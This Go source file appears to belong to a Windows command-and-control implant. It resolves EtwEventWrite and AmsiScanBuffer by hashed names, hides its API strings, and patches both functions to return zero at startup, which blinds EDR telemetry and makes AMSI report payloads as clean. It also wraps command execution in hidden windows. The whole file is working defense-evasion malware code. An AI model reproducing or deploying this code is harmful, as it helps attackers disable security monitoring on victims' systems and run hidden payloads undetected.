//go:build windows && amd64

package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

// evasion_windows.go — userland ETW / AMSI patch.
//
// Resolves EtwEventWrite (ntdll) and AmsiScanBuffer (amsi.dll) at runtime by
// djb2 hash (no plaintext API strings in the binary) and overwrites each entry
// with `xor eax,eax; ret`, so EDR userland ETW consumers receive no events and
// AMSI scans of in-memory payloads report clean.
//
// Patching is best-effort and non-fatal: the agent must start even if the
// protected regions cannot be modified.

const (
	hEtwEventWrite  = 0x24a8d022
	hAmsiScanBuffer = 0x29fcd18e
)

const (
	evTH32CS_SNAPMODULE   = 0x00000008
	evTH32CS_SNAPMODULE32 = 0x00000010
)

type evModEntry32W struct {
	Size         uint32
	ModuleID     uint32
	Th32Process  uint32
	GlblcntUsage uint32
	ProccntUsage uint32
	ModBaseAddr  uintptr
	ModBaseSize  uint32
	Module       [256]uint16
	ModuleName   [256]byte
	Path         [260]byte
}

var (
	evK32      = syscall.NewLazyDLL(xob(eEvKernel32))
	evSnap     = evK32.NewProc(xob(eEvToolhelpSnap))
	evM32F     = evK32.NewProc(xob(eEvModuleFirst))
	evM32N     = evK32.NewProc(xob(eEvModuleNext))
	evClose    = evK32.NewProc(xob(eEvCloseHandle))
	evVProtect = evK32.NewProc(xob(eEvVirtualProtect))
)

func evHashBytes(b []byte) uint32 {
	h := uint32(5381)
	for _, c := range b {
		h = h*33 + uint32(c)
	}
	return h
}

func evRead32(p uintptr) uint32 { return *(*uint32)(unsafe.Pointer(p)) }
func evRead16(p uintptr) uint16 { return *(*uint16)(unsafe.Pointer(p)) }

func evCstr(p uintptr, max int) string {
	var b []byte
	for i := 0; i < max; i++ {
		c := *(*byte)(unsafe.Pointer(p + uintptr(i)))
		if c == 0 {
			break
		}
		b = append(b, c)
	}
	return string(b)
}

// evModBase returns the base address of a loaded module in this process.
func evModBase(want string) uintptr {
	snap, _, _ := evSnap.Call(evTH32CS_SNAPMODULE|evTH32CS_SNAPMODULE32, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return 0
	}
	defer evClose.Call(snap)
	me := &evModEntry32W{}
	me.Size = uint32(unsafe.Sizeof(*me))
	if r, _, _ := evM32F.Call(snap, uintptr(unsafe.Pointer(me))); r == 0 {
		return 0
	}
	for {
		name := syscall.UTF16ToString(me.Module[:])
		if name == want {
			return me.ModBaseAddr
		}
		if r, _, _ := evM32N.Call(snap, uintptr(unsafe.Pointer(me))); r == 0 {
			break
		}
	}
	return 0
}

// evResolveExport finds a PE export by djb2 hash of its name.
func evResolveExport(base uintptr, nameHash uint32) (uintptr, error) {
	if base == 0 {
		return 0, fmt.Errorf("nil module base")
	}
	eLfanew := evRead32(base + 0x3C)
	pe := base + uintptr(eLfanew)
	if evRead32(pe) != 0x00004550 {
		return 0, fmt.Errorf("bad PE signature")
	}
	if evRead16(pe+0x18) != 0x20b {
		return 0, fmt.Errorf("not PE32+")
	}
	opt := pe + 0x18
	expRVA := evRead32(opt + 0x70)
	if expRVA == 0 {
		return 0, fmt.Errorf("no export dir")
	}
	exp := base + uintptr(expRVA)
	numNames := evRead32(exp + 0x18)
	namesRVA := evRead32(exp + 0x20)
	ordRVA := evRead32(exp + 0x24)
	funcsRVA := evRead32(exp + 0x1C)
	for i := uint32(0); i < numNames; i++ {
		nameRVA := evRead32(base + uintptr(namesRVA) + uintptr(i*4))
		name := evCstr(base+uintptr(nameRVA), 128)
		if evHashBytes([]byte(name)) == nameHash {
			ord := evRead16(base + uintptr(ordRVA) + uintptr(i*2))
			fRVA := evRead32(base + uintptr(funcsRVA) + uintptr(ord*4))
			return base + uintptr(fRVA), nil
		}
	}
	return 0, fmt.Errorf("export %#x not found", nameHash)
}

// evPatchReturnZero overwrites a function entry with xor eax,eax; ret.
func evPatchReturnZero(addr uintptr, stub []byte) error {
	if addr == 0 {
		return fmt.Errorf("nil patch target")
	}
	old := uint32(0)
	r, _, _ := evVProtect.Call(addr, uintptr(len(stub)), 0x40, uintptr(unsafe.Pointer(&old))) // PAGE_EXECUTE_READWRITE
	if r == 0 {
		return fmt.Errorf("VirtualProtect failed")
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(stub))
	copy(dst, stub)
	evVProtect.Call(addr, uintptr(len(stub)), uintptr(old), uintptr(unsafe.Pointer(&old)))
	return nil
}

// evasionInit disables userland ETW and AMSI scanning. Called once at startup.
func evasionInit() {
	if os.Getenv(xob(eC2Evasion)) == "0" {
		return
	}
	if ntd := evModBase(xob(eEvNtdll)); ntd != 0 {
		if a, err := evResolveExport(ntd, hEtwEventWrite); err == nil {
			_ = evPatchReturnZero(a, []byte{0x33, 0xC0, 0xC3}) // xor eax,eax; ret
		}
	}
	if amsi := evModBase(xob(eEvAmsi)); amsi != 0 {
		if a, err := evResolveExport(amsi, hAmsiScanBuffer); err == nil {
			_ = evPatchReturnZero(a, []byte{0x33, 0xC0, 0xC3}) // AMSI_RESULT_CLEAN
		}
	}
}

// hiddenCmdCtx wraps exec.CommandContext with HideWindow on Windows.
func hiddenCmdCtx(ctx context.Context, name string, args ...string) *exec.Cmd {
	cmd := exec.CommandContext(ctx, name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// hiddenCmd wraps exec.Command with HideWindow on Windows.
func hiddenCmd(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}
